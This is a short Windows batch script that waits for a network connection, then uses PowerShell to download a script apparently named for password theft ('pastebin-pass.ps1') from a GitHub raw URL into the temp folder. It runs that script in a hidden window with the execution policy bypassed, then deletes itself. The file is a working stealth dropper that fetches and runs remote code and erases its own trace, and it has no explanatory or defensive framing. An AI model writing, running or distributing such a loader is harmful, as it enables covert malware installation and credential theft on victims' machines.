@echo off
:while
ping www.google.com -n 1 | find "TTL="
IF %ERRORLEVEL% EQU 0 ( goto :run ) else ( goto :while )

:run
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-pass.ps1' -UseBasicParsing -OutFile $env:tmp\pass.ps1"
powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:tmp\pass.ps1' -WindowStyle Hidden"
del /f %0
